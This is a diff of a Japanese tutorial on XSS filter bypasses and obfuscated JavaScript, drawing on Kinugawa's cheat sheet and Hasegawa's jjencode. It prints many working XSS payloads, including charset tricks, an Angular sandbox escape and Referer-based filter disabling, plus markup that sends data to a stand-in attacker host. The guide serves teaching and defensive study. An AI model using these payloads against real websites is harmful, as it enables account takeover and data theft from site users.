+PTAT が「アプリ開発者が書いたフィルタ」を抜く辞書だったのに対し、Masato Kinugawa（クロスサイトスクリプティング研究の第一人者。Cure53 所属で、数々のブラウザ脆弱性を報告してきた研究者）の **filterbypass** リポジトリは、**ブラウザ自身に組み込まれていた XSS 防御機構**を抜く技術を体系化したものです。GitHub で約 1.2k スター、ペンテスト・セキュリティ研究コミュニティで広く参照されてきました。中核は Wiki の 2 ページ、「Browser's XSS Filter Bypass Cheat Sheet」と「Fixed Bypass Archive」です。
+
+> 出典: masatokinugawa/filterbypass — https://github.com/masatokinugawa/filterbypass
+
+#### まず「ブラウザXSSフィルタ」とは何だったか、そして今どうなったか
+
+反射型 XSS 対策として、かつてブラウザには「**リクエストに含まれる文字列**（URL パラメータ等）が、**レスポンスの HTML にほぼそのまま反射**していたら、それを反射型 XSS の疑いと見なして無害化する」機構が入っていました。代表が Chrome / Safari の **XSS Auditor** と、IE / Edge の **XSS Filter** です。歴史は次のとおりです。
+
+- **2008 年**: Microsoft が Internet Explorer 8 で XSS Filter を初導入。`X-XSS-Protection` ヘッダで制御。
+- **2010 年頃〜**: Chrome / Safari（WebKit/Blink）が同種の **XSS Auditor** を実装。
+- **2018 年 7 月 25 日**: Microsoft が Edge の XSS Filter 廃止を表明（Windows 10 RS5 / 2018 年 10 月更新で削除）。
+- **2019 年 8 月 5 日**: Google が Chrome 78 で **XSS Auditor を完全削除**すると告知。理由は「クロスサイトの情報漏えい（XS-Leaks）を新たに生む副作用があり、かつ回避手法が広く知られてしまった」ため。
+
+> つまり **本節で扱うブラウザ XSS フィルタは、2018〜2019 年にすべて廃止済みの機構**です。現行のどのブラウザにも入っていません。`X-XSS-Protection` ヘッダも非推奨で、現代の反射型 XSS 対策の中心は CSP（Content Security Policy）と適切な出力エスケープに移りました。
+
+> 出典: Goodbye XSS Auditor（Invicti / Chromium）— https://www.chromium.org/developers/design-documents/xss-auditor/ ／ Deprecations and removals in Chrome 78 — https://developer.chrome.com/blog/chrome-78-deps-rems ／ An Update on the Edge XSS Filter — https://textslashplain.com/2018/11/06/an-update-on-the-edge-xss-filter/
+
+##### では、なぜ今なお学ぶ価値があるのか
+
+廃止された機構でも、Kinugawa のチートシートには**設計上の普遍的教訓**が詰まっています。
+
+1. **「反射している文字列を機械的に消す」方式は必ず破れる**。フィルタが見る「送信バイト列」と、ブラウザが最終的に描画する「HTML ツリー」は、文字コードの再解釈・パーサのエラー回復・名前空間の切替によって**一致しない**。この非対称性は、今の WAF や自作サニタイザにもそのまま当てはまります。
+2. **フィルタは新たな脆弱性を生む**。Auditor が「消す」ことでかえって別の攻撃面（後述の character deletion/substitution）や情報漏えいを作った——「防御機構を足すと攻撃面が増える」という逆説の実例です。
+3. **文字コードとパーサの境界こそ主戦場**。ISO-2022-JP、HZ-GB-2312、UTF-7、x-chinese-cns といった charset 依存の回避は、mXSS や現代のサニタイザ回避と同じ原理で動きます。
+
+Kinugawa のチートシートは各項目を「**Unprotected**（そもそもフィルタが守っていなかった＝設計上の穴）」と「**Bypass**（本来守るはずなのに抜けた＝実装のバグ）」に分けている点が秀逸です。以下、原典の実例で見ていきます。
+
+> 出典: Browser's XSS Filter Bypass Cheat Sheet — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
+
+#### XSS Auditor（Chrome / Safari）が「そもそも守っていなかった」穴（Unprotected）
+
+Auditor は「リクエストの文字列がレスポンスに反射する反射型」だけを対象にしていました。したがって**構造的に守れない**ケースがあります。
+
+```html
+<!-- (1) 文字列リテラル内に落ちる注入は対象外 -->
+<script>var q="";alert(1)//</script>
+
+<!-- (2) href の javascript: だけの注入も対象外 -->
+<a href="javascript:alert(1)">Link</a>
+
+<!-- (3) DOM 型（document.write 以外）は対象外 -->
+document.body.innerHTML=decodeURIComponent(hash);
+
+<!-- (4) 複数の注入ポイントを跨ぐもの（意図的に非対象。Chromium bug #96616, #403636） -->
+<div>`-alert(1)</script><script>`</div>
+```
+
+なぜ抜けるか: Auditor の設計は「危険な**タグやハンドラの丸ごとの反射**」を探すものでした。(1) のように既に開いている `<script>` の**文字列リテラル内**へ入る注入は、新しいタグを作らないので検知対象外。(3) の DOM 型は、そもそもサーバーレスポンスに反射しない（クライアント JS が組み立てる）ので Auditor の視界の外。設計思想の外側は、バグですらなく最初から素通しなのです。
+
+さらに、Auditor が「消す」動作そのものが攻撃面を作りました（character manipulation）。
+
+```html
+<!-- 削除で新ベクタが生成される -->
+<svg o<script>nload=alert(1)>   →  <svg onload=alert(1)>
+<!-- 置換で新ベクタが生成される -->
+<script>/&/-alert(1)</script>   →  <script>/&amp;/-alert(1)</script>
+```
+
+なぜ抜けるか: Auditor は反射した危険部分（`<script>`）を検出して**削除**しますが、削除後の残骸 `<svg o` + `nload=alert(1)>` が連結して `<svg onload=...>` という**新しい有効なベクタ**に化けます。「防御が攻撃を生む」典型です。
+
+#### XSS Auditor の実際のバイパス（Bypass）——文字コードと同一オリジン資源
+
+ここからは「本来守るはずが抜けた」実装バグです。
+
+```html
+<!-- ISO-2022-JP のエスケープシーケンスでパーサと Auditor の見え方をズラす -->
+<meta charset=iso-2022-jp>
+<svg o<ESC>(Bnload=alert(1)>
+```
+
+なぜ抜けるか: `<ESC>(B`（バイト列 `0x1B 28 42`）は ISO-2022-JP の「ASCII に戻る」エスケープシーケンスで、**HTML パーサはこれを無視して読み飛ばし** `<svg onload=...>` を組み立てます。ところが Auditor は別の段階でバイト列を見るため、`o<ESC>(Bnload` を「`onload` ではない別物」と誤認して見逃す。**同じバイト列を、パーサと防御機構が違う文字コードで解釈する**——charset 起因のズレの教科書例です。
+
+```html
+<!-- 同一オリジンの資源を読み込ませる（Auditor はクエリ無しの同一オリジン取得を止めない） -->
+<script src=/bypass/usercontent/xss.js></script>
+<!-- 同一オリジンのフレームワークを悪用（Angular テンプレートインジェクション） -->
+<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}</p>
+<!-- 同一オリジンの jQuery + DOM Clobbering -->
+<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
+```
+
+なぜ抜けるか: Auditor は「反射した**外部**スクリプトの読み込み」を主眼にしており、**クエリ文字列を持たない同一オリジンの `<script src>`** は原則ブロックしませんでした。そこでアップロード済みの自ファイルや、サイトに元からある Angular / jQuery を「部品（gadget）」として呼び出し、`{{constructor.constructor('alert(1)')()}}`（Angular のサンドボックス脱出テンプレート式）でコード実行します。フィルタは「タグの反射」しか見ておらず、既存フレームワークの悪用は視界の外——後章の「gadget を使った CSP バイパス」と同じ発想の原型です。
+
+Safari 固有のバグも多数あります（いずれも当時のバージョンで有効）。
+
+```html
+<!-- SVG animate の values に全角スペース + javascript: を混ぜる（Safari） -->
+<svg xmlns:xlink=http://www.w3.org/1999/xlink>
+<animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" />
+<a id=x><rect width=100 height=100 /></a>
+
+<!-- 複数の NULL バイトでパースを混乱させる（Safari） -->
+[0x00]×7<script>alert(1)</script>
+
+<!-- 未完の base タグで相対 URL の解決先を攻撃者側へ（Safari） -->
+<div><embed allowscriptaccess=always src=/xss.swf><base href=//cors.l0.cm/</div><script src=/test.js></script>
+```
+
+なぜ抜けるか: いずれも「Auditor が検査する時点」と「Safari が実際にパース・解決する時点」で、値の解釈が食い違うことを突いています。`&#x3000;`（全角スペース）や NULL バイトは、Auditor には「javascript URL ではない」ように見え、Safari パーサには無害な空白として除去され `javascript:alert(1)` が残ります。
+
+#### IE / Edge XSS Filter のバイパス——Referer・名前空間・文字コード
+
+IE / Edge の Filter も同様に、Unprotected（文字列リテラル、全 DOM 型、複数注入点）を持ちつつ、実装バグで抜けました。特徴的なのが **Referer による無効化**です。
+
+```html
+<!-- 同一ドメインからのリンクだと Filter が無効化される -->
+<a href="https://vulnerabledoma.in/bypass/text?q=<script>alert(1)</script>">Click</a>
+<!-- iframe を自己参照させて同一 Referer を作り Filter を無効化 -->
+<iframe onload="contentWindow[0].location='//vulnerabledoma.in/bypass/text?q=<script>alert(location)</script>'"
+ src="//vulnerabledoma.in/bypass/text?q=%3Ciframe%3E"></iframe>
+```
+
+なぜ抜けるか: IE / Edge は「同一ドメイン内の遷移や localhost からのアクセスでは XSS Filter を無効化する」仕様でした（正規の同一サイト内リンクを誤検知しないための配慮）。攻撃者は**被害サイト自身の中に**リンクや自己参照 iframe を作れば、Referer が同一ドメインになり Filter が黙るのです。「例外規定が抜け道になる」教訓。
+
+名前空間・文字コードのズレも多彩です。
+
+```html
+<!-- Edge: 名前空間もどきの記法で embed を script と誤認させる -->
+<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
+
+<!-- IE: nosniff 欠如で XML として sniff させ名前空間でバイパス -->
+<?xml version="1.0"?>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1&#x29;);</x:script>
+
+<!-- IE: UTF-7 BOM を送り込みページのエンコーディングを再解釈させる -->
++/v8-+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+<!-- IE/Edge: 遷移時のエンコーディング不一致（x-chinese-cns） -->
+<meta charset=utf-8>
+<script>
+ document.charset="x-chinese-cns";
+ location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)</script/旡"
+</script>
+
+<!-- IE/Edge: CSS 内の実体参照を Filter が無視する -->
+<svg><style>&commat;import'//attacker'</style>
+<svg><style>@&bsol;0069mport'//attacker'</style>
+```
+
+なぜ抜けるか: `+ADw-` は UTF-7 で `<` を表すシーケンスで、`+/v8-`（UTF-7 の BOM）を先頭に置くと、`X-Content-Type-Options: nosniff` が無い応答で IE がページを **UTF-7 と再解釈**します。すると Filter が検査したバイト列（`+ADw-script...`）と、ブラウザが描画する文字（`<script...`）が食い違い、Filter は「script タグが無い」と判断して素通し。x-chinese-cns の例も同じ原理で、`旡`（0xA13E）が送信時のエンコーディングと Filter の解釈で違う文字に化けます。`&commat;`（＝`@`）や `&bsol;`（＝`\`）は、Filter が CSS 内の実体参照を復号せず素通しするのを突いて `@import` を隠します。**「防御機構がどの層で文字を見るか」を一段ズラせば必ず破れる**——チートシート全体を貫く原理です。
+
+#### Fixed Bypass Archive——「修正された穴」の博物館
+
+Wiki のもう一つのページ「Fixed Bypass Archive」は、上記のうち**すでに各ブラウザで修正されたバイパス**を、修正バージョン付きで記録したものです。代表例（原典の記載）:
+
+- **SVG animate の values 属性**（Chrome 59〜62 で修正）: `<svg><animate href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x>`
+- **未完の script タグ閉じ**（Chrome 61 で修正）: `<script>alert(1)</script `（末尾に空白）
+- **複数 NULL バイト**（Chrome 62 で修正）: `[0x00]×7<script>alert(1)</script>`
+- **script 内の HTML コメント構文**（Chrome 62 で修正）: `<script>alert(1)\n--></script>`
+- **未完の form タグ**（Chrome 62 で修正）: `"></form><form action=https://attacker/`（フォーム送信先を乗っ取る）
+- **object + param（Flash 前提）**（Chrome 64 で修正）
+- **未完の base タグ + リンク**（Chrome 65 で修正）
+- **Edge の Referer 詐称バグ**（2018 年 4 月修正）
+
+> 出典: Fixed Bypass Archive — https://github.com/masatokinugawa/filterbypass/wiki/Fixed-Bypass-Archive
+
+このアーカイブの価値は、**「一つ塞いでも、パーサの別状態・別文字コードから必ず次の穴が出る」**という、いたちごっこの記録そのものにあります。修正バージョンが Chrome 59→61→62→64→65 と刻まれていく様子は、ブラックリスト的防御の限界を可視化しています。最終的にベンダー自身が「これは原理的に守りきれず、しかも副作用がある」と結論して機構ごと撤去した——これが 2018〜2019 年の廃止の背景です。
+
+---
+
+### この節のまとめ——「文脈」と「層のズレ」
+
+二つの資料は、抽象度の異なる同じ真実を語っています。
+
+- **PTAT の教訓**: XSS ペイロードは丸暗記するものではなく、**自分の入力が落ちるコンテキスト（HTML 本文／属性値／JS 文字列／URL／CSS／XML）を特定し、そこで復号・実行される表記を選ぶ**もの。エンコーディング回避が効くかどうかは、「どの層がいつその表記を復号するか」で決まります。
+- **filterbypass の教訓**: 反射文字列を機械的に消す防御は、**フィルタが見るバイト列とブラウザが組み立てる HTML ツリーのズレ**（文字コード再解釈・パーサのエラー回復・名前空間切替・Referer 例外）によって必ず破れる。ブラウザベンダーですら 10 年かけて諦めた。だからこそ現代の対策は、パターン検出（ブラックリスト）ではなく、**出力コンテキストに応じたエスケープ**と **CSP** による多層防御へ移りました。
+
+次節以降で扱う mXSS、Trusted Types、CSP バイパスは、いずれもここで見た「層のズレ」を、より深い場所で突く技術です。本節の「なぜ動くか」を土台に読み進めてください。
 
 ---
 
 ## 難読化・短縮JavaScript（Kinugawa / はせがわ）
 
-反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード」として解釈・実行されてしまう脆弱性）を理解した読者が次に直面するのが、「危険な文字や単語を検出して弾く仕組み（フィルタ）を、攻撃者はどうやってすり抜けるのか」という問題です。前セクション（フィルタ回避）では「そもそもブラックリスト方式は原理的に破綻している」という上位の原理を扱いました。本セクションは、その敗北を**具体的な技術として実証する**3つの資料を精読・統合します。
+前節までで「どこに」「どんな形で」ペイロードを注入するか（コンテキスト）と、フィルタをすり抜けるための発想を見てきました。本節では、その延長線上にある二つの深い技術を扱います。ひとつは、**攻撃コードを人間にもフィルタにも読めない形に書き換える「難読化」**。もうひとつは、**そもそも使える文字が極端に絞られた状況で、それでも任意のJavaScriptを実行してしまう「短縮／制限文字集合」**の技術です。
 
-- **資料1 — 樹下雅章（Masato Kinugawa）「XSSフィルターの使い方」（Shibuya.XSS techtalk #9）**: ブラウザに内蔵されていた反射型XSS遮断機能（XSS Auditor / XSSフィルター）そのものを題材に、「どう回避するか」だけでなく「その防御機能を逆に攻撃の道具として使う」という発想を扱った資料。
-- **資料2 — 樹下雅章「5文字で書くJavaScript」（Shibuya.XSS techtalk #10）**: 任意のJavaScriptを、ごく少数の文字種だけで書く「短縮JavaScript」の理論。JSFuck（6文字）の仕組みと、それを5文字へ削る樹下氏の研究を扱う。
-- **資料3 — はせがわようすけ（Yosuke Hasegawa）「難読化JavaScript」**: 記号だけでJavaScriptを書くjjencode／aaencode（いずれもはせがわ氏の作）を筆頭に、難読化（コードを人間に読めない形へ変形すること）の原理と、防御側から見た意味を扱う。
+この分野を切り拓いてきたのは、日本の研究者である**衣笠正人（Masato Kinugawa）**と**はせがわようすけ（Yosuke Hasegawa）**の二人です。二人が主宰・登壇してきた勉強会「Shibuya.XSS」の発表を軸に、`jjencode`・`aaencode`・`JSFuck`・「5文字JavaScript」といった一連の技法を、**「なぜその記号の羅列がコードとして動くのか」**という原理レベルで解剖していきます。
 
-この3つは一本の線でつながっています。**「危険なパターンを列挙して弾く」という防御は、攻撃側が“同じ処理を無数の別表記で書ける”限り必ず破れる**——難読化・短縮JavaScriptは、その事実の最も純粋な実証です。本セクションの価値は個々のペイロード（攻撃を成立させる実際の入力文字列）の丸暗記ではなく、**なぜブラウザやJavaScriptエンジンが、そんな壊れた・奇妙な入力まで実行してしまうのか**という仕組みのレベルの理解にあります。
+> ⚠️ **資料の性質についての注記**: 本節の一次資料である Speaker Deck のスライド（Shibuya.XSS #9 / #10）は、本文がスライド**画像**として埋め込まれており、テキストとしての機械抽出が困難でした。そのため本節は、同じ内容を著者本人が文章化した一次資料（衣笠氏のセキュリティブログ、`filterbypass` Wiki、JSFuck の公式リポジトリ、esolangs / Wikipedia の記述、`aem1k.com` のデモ）を突き合わせて再構成しています。スライドそのものからの逐語引用ではない点にご留意ください。
 
 ---
 
-### 0. 本セクションの資料取得状況（重要な但し書き）
+### なぜ「難読化」と「制限文字」を学ぶのか
 
-本セクションが対象とする3つのURLは、いずれも自動取得の際にネットワーク側のエグレス制限（外部サイトへの直接アクセスを制限する仕組み）によって直接取得できませんでした（speakerdeck.com / docswell.com が丸ごとブロック）。ただし、以下の**一次・準一次ソース**を用いて実質的な内容を復元しています。
+XSSの攻撃者にとって、難読化と制限文字集合の技術が必要になる場面は主に三つあります。
 
-- 資料1（XSSフィルターの使い方）については、樹下氏本人がGitHub上で公開・保守している姉妹資料 **「Browser's XSS Filter Bypass Cheat Sheet」**（`github.com/masatokinugawa/filterbypass` のWiki）を全文取得しました。これは同発表とCODE BLUE 2015「XSS Attacks Exploiting XSS Filter」の内容を体系化した、実質的な一次ソースです。
-- 資料2（5文字で書くJavaScript）については、JSFuck公式リポジトリ（`github.com/aemkei/jsfuck`）のREADMEとマッピング定義（`jsfuck.js`）を全文取得し、そこに樹下氏のパイプライン演算子による5文字化の情報（Xchars.js／esdiscuss／Wikipedia）を突き合わせました。
-- 資料3（難読化JavaScript）については、はせがわ氏作のjjencode／aaencodeの原理をJSFuckの原理と対照し、複数の解説・実装から復元しました。
+1. **シグネチャ検知の回避**: WAFやIDS、ウイルス対策ソフトは `eval(` `alert(` `<script>` `document.cookie` といった「いかにも」な文字列パターンをブラックリストで弾きます。コードを記号の羅列に変換してしまえば、これらの文字列はソース中のどこにも現れなくなり、パターンマッチが空振りします。
+2. **使える文字の物理的制限**: 注入点によっては、英数字が使えない・特定の記号しか通らない、というケースがあります。たとえば「英字は全部大文字化される」「クオートとバックスラッシュだけが生き残る」といった状況で、それでもコードを組み立てる必要が出てきます。
+3. **防御側の教訓**: 攻撃側の到達点を知ることは、そのまま防御設計の限界を知ることでもあります。「ブラックリストで危険な文字列を消す」という発想が、なぜ原理的に破綻するのか——難読化はその最も鮮烈な反例です。
 
-各トピックの冒頭には、ユーザー指示に従い「未取得の資料」ブロックを明示し、そのうえで復元内容を記述します。厳密な原文（スライドの図・言い回し）は各URLからご確認ください。
+はせがわようすけ氏は難読化の動機を、**「圧縮の副作用」「アンチウイルス／IDSのシグネチャ回避」「デバッグ妨害（解析されにくくする）」**の三つに整理しています。攻撃・防御のどちらの立場でも、「読めないコードでも確実に動く」というJavaScriptの言語特性そのものを理解することが本節のゴールです。
 
----
-
-### 1. 前提：短縮・難読化はなぜXSSの「武器」になるのか
-
-XSSの現場で開発者が仕掛ける関門は、おおむね次の3種類です。
-
-1. **アプリ側のフィルタ／ブラックリスト**: `<script>`、`alert`、`javascript:`、`on〇〇=` のような「危険そうな文字列」を検出して削除・拒否する。
-2. **WAF（Web Application Firewall: Webアプリの前段でリクエストを検査し、攻撃パターンを遮断する装置）**: 正規表現ベースでペイロードを検出する。
-3. **CSP（Content Security Policy: ページが読み込み・実行してよいスクリプトの出所をブラウザに宣言するヘッダ）** や、かつてのブラウザ内蔵 **XSSフィルター**。
-
-短縮・難読化JavaScriptは、この1〜3のうち主に1と2、そして状況によっては3をも突破するための技術です。要点は次の一言に尽きます。
-
-> **同じ `alert(1)` を、`alert` という文字を一切使わずに、記号だけで、あるいは5〜6種類の文字だけで書けるなら、「`alert` を弾く」「英数字を弾く」といったフィルタは意味をなさない。**
-
-以下では、(A) 防御機能そのものを回避・悪用する技術（資料1）、(B) 文字種を極限まで削る短縮技術（資料2）、(C) 記号だけで書く難読化技術（資料3）の順に見ていきます。
+> 出典: はせがわようすけ「難読化JavaScript」 — https://www.docswell.com/s/hasegawa/K9VW8M-jsobfus
 
 ---
 
-### 2. XSSフィルターの「使い方」— 防御機能を回避し、逆用する（資料1 / Kinugawa）
+### 第1部 記号だけでJavaScriptを書く（はせがわ: jjencode / aaencode / 非英数字JS）
 
-> ⚠️ **未取得の資料**: 「XSSフィルターの使い方 / Shibuya.XSS techtalk #9（Masato Kinugawa）」は自動取得できませんでした（理由: speakerdeck.com がネットワークのエグレス制限で全面ブロックされているため）。以下のURLからユーザーご自身で直接ご覧ください: https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9
->
-> （以下は、樹下氏本人が公開する姉妹一次資料「Browser's XSS Filter Bypass Cheat Sheet」およびCODE BLUE 2015発表の内容に基づく解説です。）
+#### 出発点: JavaScriptの「暗黙の型変換」
 
-#### 2.1 そもそもXSSフィルター（XSS Auditor）とは何か、どう動くのか
+記号だけでコードを書く技術の土台は、JavaScriptの**暗黙の型変換（type coercion）**という仕様上の性質にあります。JavaScriptは、演算子が要求する型に合わせて値を自動的に変換します。この「勝手に変換してくれる」性質を逆手に取ると、数値リテラルも文字リテラルも一切書かずに、記号だけで任意の値を組み立てられます。
 
-**XSSフィルター**とは、かつてブラウザに内蔵されていた「反射型XSSをブラウザ側で検出・遮断する機能」です。Chrome/Safari系では **XSS Auditor**、Internet Explorer / 旧Edgeでは **XSS Filter** と呼ばれました（`X-XSS-Protection` ヘッダで制御）。
+まず**真偽値**を作ります。
 
-仕組みの核心はこうです。
-
-1. ブラウザはページを受信すると、**そのページを開くために送ったリクエスト（URLのクエリ文字列やPOSTボディ）の中身**と、**返ってきたレスポンスHTMLの中身**を突き合わせる。
-2. 「リクエストに含まれていた文字列」が「レスポンスHTMLの中でスクリプトとして働く形（例: `<script>...</script>` や `onerror=...`）」でそのまま出現していたら、「これは反射型XSSだ」とみなす。
-3. 該当箇所を無害化（スクリプトを実行させない）してからページを描画する。
-
-つまりXSS Auditorは、**「送った入力が、実行可能なコードとして反射されている」というパターンマッチ**で動いています。ここが弱点の源泉です。攻撃者が「フィルタが見る文字列」と「ブラウザが最終的に組み立てるDOM（Document Object Model: HTMLを解析して作る要素のツリー構造）」を食い違わせられれば、遮断は空振りします。これは前セクションのInvictiの主張（「フィルタが見る文字列とブラウザが作るツリーは別物」）の、ブラウザ内蔵フィルタ版です。
-
-#### 2.2 発表のもう一つの主眼：フィルターを「攻撃の道具」に転用する
-
-このシリーズ（Shibuya.XSS #9 と CODE BLUE 2015「XSS Attacks Exploiting XSS Filter」）が衝撃的だったのは、単なる回避集ではなく、**防御機能であるはずのXSSフィルターを、攻撃者が能動的に悪用できる**と示した点です。核心的なアイデアは次の2つです。
-
-- **正規のスクリプトを狙って無効化する（Induced XSS / スクリプトの選択的殺害）**: XSSフィルターは「リクエスト中の文字列と一致する部分」を無効化します。攻撃者は、**攻撃したいページに元から存在する“正規のインラインスクリプト”の断片**をURLパラメータにわざと含めて送りつけられます。するとフィルターは「これはXSSだ」と誤認し、**本来ページを守っていた正規スクリプトの方を無効化**してしまいます。これにより、たとえば次のような防御を破壊できます。
-  - ページが `<script>` でCSPを動的に設定していたり、フレーム破り（framebusting: 自分が `<iframe>` 内に埋め込まれていたら抜け出すコード）を行っていたりする場合、その防御スクリプトを狙撃して無力化する。
-  - 結果として、そのままでは成立しなかったクリックジャッキングや別のXSSが成立するようになる。
-- **CSPのバイパスに転用する**: 後述の「同一オリジンのリソースの利用」で、CSPが `default-src 'self'` のように同一オリジンのみ許可している状況でも、同一オリジン上のFlashやライブラリを踏み台にスクリプト実行へ持ち込める（フィルターの遮断挙動と組み合わせる）。
-
-この「防御を攻撃に転用する」視点が、後にブラウザベンダがXSS Auditor / XSSフィルターを**廃止する**判断（詳細は2.6）に直結しました。防御として不完全なだけでなく、有害でもあったのです。
-
-#### 2.3 そもそも「遮断対象でない」文脈 — 保護が最初から存在しない穴
-
-XSS Auditorには、構造的に**最初から保護しない**文脈が多数あります。ここでは特別な細工なしにスクリプトが実行できます。診断者にとっては「フィルタがあっても攻撃可能」を示す重要な材料です。
-
-**(a) 文字列リテラル内で起こるXSS**（入力がJSの文字列 `"..."` の中に入るタイプ）:
-
-```html
-<script>var q="";alert(1)//"</script>
-```
-> なぜ動くか: 入力 `";alert(1)//` が既存のJS文字列を閉じ、続けて新しい文（`alert(1)`）を書き、`//` で残りをコメント化している。Auditorはこの「文字列リテラルからの脱出」型を（現在は）遮断対象にしていない。
-
-**(b) URL単独で成立するXSS**（入力が `<a href>` などにそのまま入る）:
-
-```html
-<a href="javascript:alert(1)">Link</a>
-```
-> なぜ動くか: `javascript:` スキーム（URLの代わりにJavaScriptを実行する疑似プロトコル）は、リンクのクリックで発火する。Auditorはこの単独ケースを遮断しない。
-
-**(c) 注入ポイントが2つ以上あるケース**: 1つの入力値がページ内の2か所に反映される場合、片方で開いて片方で閉じる形にでき、Auditorはこれを取りこぼす（Chromiumでも過去にWontFix扱い）。
-
-```html
-<div>`-alert(1)</script><script>`</div>
-<div>`-alert(1)</script><script>`</div>
+```javascript
+![]        // → false （配列は truthy なので、否定すると false）
+!![]       // → true  （false をもう一度否定すると true）
 ```
 
-**(d) 文字列の削除・置換が挟まる場合**: サーバ側が入力の一部を削除・置換すると、フィルタが見る文字列と最終出力がズレて遮断が外れる。
+`[]`（空配列）はJavaScriptでは「真」と評価される値（truthy）です。これを論理否定演算子 `!` で反転すると `false`、もう一度反転すると `true` になります。ここまで英数字はゼロです。
 
-```html
-削除される例:
-<svg o<script>nload=alert(1)>   →（<script>が削除され）→   <svg onload=alert(1)>
+次に**数値**を作ります。鍵は単項の `+` 演算子で、これは「オペランドを数値に変換せよ」という命令です。
 
-置換される例:
-<script>/&/-alert(1)</script>   →（&が&amp;に置換され）→   <script>/&amp;/-alert(1)</script>
+```javascript
++[]           // → 0     （空配列を数値化すると 0）
++!+[]         // → 1     （+[] が 0、!0 が true、+true が 1）
+!+[]+!+[]     // → 2     （true + true = 1 + 1 = 2 と加算される）
++[![]]        // → NaN   （[false] を数値化しようとして失敗 → NaN）
 ```
-> なぜ動くか: Auditorは「送信された生の文字列」で判定するが、実際にDOM化されるのは「削除・置換後の文字列」。両者が異なるため、遮断条件にマッチしない。
 
-**(e) `document.write()` 以外のDOM based XSS**: `innerHTML` や `location.href` への代入で起きるDOM XSS（入力がサーバを経由せずJSだけで危険なsink（sink: ユーザー入力が最終的に実行・解釈される危険な代入先。例: `innerHTML`）に渡る）は、そもそもリクエストとレスポンスの突き合わせで捕まえられない。
+`+[]` が `0` になるのは、空配列を文字列化すると空文字 `""` になり、それを数値化すると `0` だからです。`!+[]` は `!0`、すなわち `true`。これに単項 `+` を付けると `true` は数値 `1` に変換されます。`true + true` のように `+` を二項演算子として使うと、両辺が数値 `1` に変換されて加算され、`2` が得られます。この要領で任意の整数を組み立てられます。
 
-```html
-<script>
-  hash=location.hash.slice(1);
-  document.body.innerHTML=decodeURIComponent(hash);  // #<img src=x onerror=alert(1)>
-</script>
+そして**文字**を作ります。値を文字列化し、インデックスで一文字ずつ取り出すのがコツです。
+
+```javascript
+![]+[]              // → "false" （false と空配列を + で連結 → 文字列化）
+!![]+[]             // → "true"
+[][[]]+[]           // → "undefined" （存在しないプロパティ参照 → undefined → 文字列化）
++[![]]+[]           // → "NaN"
+
+(![]+[])[+!+[]]     // → "a"  （"false"[1]）
+(![]+[])[!+[]+!+[]] // → "l"  （"false"[2]）
 ```
-> なぜ動くか: ペイロードはURLのハッシュ（`#` 以降。サーバへ送信されない部分）に置ける。サーバのレスポンスにはペイロードが現れないため、反射の検出が原理的に不可能。
 
-**(f) XMLページ／Content Sniffingでの実行**:
+`![]+[]` は「`false` と `[]`（空配列＝空文字扱い）を `+` で連結」する式で、結果は文字列 `"false"` になります。あとはインデックスアクセスです。`(![]+[])[1]` は `"false"` の2文字目、つまり `"a"`。インデックスの `1` すらも `+!+[]` という記号列で書けるので、全体が記号だけで完結します。同様に `"false"` からは `a e f l r s t u`、`"true"` からは `r u`、`"undefined"` からは `d f i n`、`"NaN"` からは `N` が拾えます。
 
-```xml
-<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+こうして集めた文字を `+` で連結すれば、`"constructor"` のような任意の文字列を組み立てられます。文字列にできれば、あとは**ブラケット記法**でプロパティにアクセスできます（`obj.foo` と `obj["foo"]` は等価）。ここから一気にコード実行へ到達します。
+
+#### jjencode: 18種類の記号でコードをエンコードする
+
+はせがわようすけ氏が2009年7月に公開した **jjencode** は、この考え方を「任意のJavaScriptソースを、記号だけの文字列へ自動変換するエンコーダ」として実装したものです。出力に使われる記号は次の18種類だけです。
+
 ```
-> なぜ動くか: XHTMLの名前空間（`xmlns`）を宣言したXMLとして解釈されると、`<script>` がスクリプトとして実行される。`Content-Type` が正しくなくContent Sniffing（ブラウザが中身を見てMIMEタイプを推測する挙動）でXMLが選ばれた場合にも起こる。
-
-このほか、実行までは至らなくても攻撃に使える「許容される記述」として、`http(s):` リンクの偽装（フィッシング文言のリンク挿入）、片側だけ閉じない引用符で秘密情報を外部送信する `<img src="https://attacker/?data=`、任意CSSの注入（`@import` や `<link rel=stylesheet>` による情報窃取）などが挙げられています。
-
-#### 2.4 代表的なバイパス技法（遮断が働く場面をすり抜ける）
-
-以下は、Auditor / XSSフィルターが本来遮断するはずの状況を、仕組みの隙を突いて回避する技法群です。これらの多くは「**同一オリジンにある正規のリソースを踏み台にする**」「**文字コードの解釈差を突く**」という2大原理に集約されます。
-
-**(1) 同一オリジンのリソース（ライブラリ）を踏み台にする**
-
-XSS Auditorは「**クエリを持たない同一オリジンのリソースのロード**」を遮断しません。同一オリジン上にテンプレートエンジンやライブラリがあると、それを間接的に起動して任意コード実行に持ち込めます。原理の中心は **`constructor.constructor`** です（後述の難読化とも共通する超重要ガジェット）。
-
-```html
-Angularの例:
-<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
+[ ] ( ) ! + , " $ . : ; _ { } ~ =
 ```
-> なぜ動くか: Angularは `ng-app` 属性を持つ要素内の `{{ }}`（テンプレート式）を評価する。式 `constructor.constructor('alert(1)')()` は、ある値の `constructor`（＝そのクラス。例: `Object`）→ さらにその `constructor`（＝ `Function` コンストラクタ）とたどり、`Function('alert(1)')()` を作って実行する。つまり `<script>` も `alert(` も「フィルタが探す形」では現れないのに、任意のJSが動く。この `constructor.constructor` によるサンドボックス脱出は、テンプレートインジェクション（CSTI）全般で最重要のイディオム。
 
